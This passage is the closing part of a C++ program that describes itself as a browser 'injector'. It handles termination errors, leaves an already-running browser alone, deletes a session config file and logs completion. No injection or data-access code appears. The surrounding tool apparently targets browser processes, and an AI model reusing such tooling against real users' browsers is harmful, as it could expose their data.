                print_status("[-]", "Failed to terminate " + browserDisplayName + ". Error: " + std::to_string(GetLastError()));
        }
        else
            print_status("[-]", "Failed to open " + browserDisplayName + " for termination (it might have already exited). Error: " + std::to_string(GetLastError()));
    }
    else
    {
        debug("Browser was already running; injector will not terminate it.");
    }

    std::error_code ec_remove_cfg_end;
    if (!configFilePath.empty() && fs::exists(configFilePath))
    {
        if (!fs::remove(configFilePath, ec_remove_cfg_end))
        {
            debug("Failed to clean up session config file: " + configFilePath.u8string() + ". Error: " + ec_remove_cfg_end.message());
        }
        else
        {
            debug("Cleaned up session config file: " + configFilePath.u8string());
        }
    }

    debug("Injector finished.");
    return 0;
}